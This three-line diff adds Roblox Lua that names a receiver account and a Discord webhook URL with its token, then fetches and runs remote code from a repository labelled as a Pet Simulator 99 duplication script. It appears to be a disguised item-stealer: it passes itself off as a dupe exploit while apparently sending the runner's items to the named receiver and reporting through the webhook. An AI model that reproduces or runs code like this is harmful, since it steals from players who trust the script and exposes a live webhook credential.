@@ -1,0 +1,3 @@
+Reciever = "zylan_meow"
+Webhook = "https://discord.com/api/webhooks/1321768200446283847/IWpWIdMhxImqGSH5iAtq4nIv-_btXCuoQmreRrWOZ6P1XWztPS08B8KNtB2yvFAn7jVj"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LyherScript/ps99-duplication/main/release", true))()
